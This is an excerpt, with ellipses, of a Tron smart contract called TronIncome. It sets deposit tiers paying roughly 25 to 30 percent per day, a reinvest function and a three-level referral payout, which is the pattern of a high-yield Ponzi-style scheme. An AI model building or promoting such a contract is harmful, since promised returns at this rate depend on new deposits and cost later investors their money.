...
contract TronIncome {
    ...
    uint256 public minDepositSize = 100 * TRON;//100000000
    uint256 public interestRateDivisor = 1000000000000;//1000000000000
    uint256 public comissionsRate = 10;
    uint256 public commissionDivisor = 100;
    uint256 public startTime = 1594305000; //1594305000
    ...
    constructor() public {
      ...
      level_[0] =  Level(2893512, minDepositSize); //daily 25
      level_[1] =  Level(3009259, 5000 * TRON);    //daily 26
      level_[2] =  Level(3125000, 10000 * TRON);   //daily 27
      level_[3] =  Level(3240741, 20000 * TRON);   //daily 28
      level_[4] =  Level(3472222, 50000 * TRON);   //daily 30
    ...
    function reinvest() public {
      ...
      uint256 refAmount = depositAmount.mul(30).div(100);
    ...
    function distributeRef(uint256 _trx, address _affFrom) private{
        ...
        address _affAddr2 = players[_affAddr1].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        uint256 _affRewards = (_trx.mul(10)).div(100);
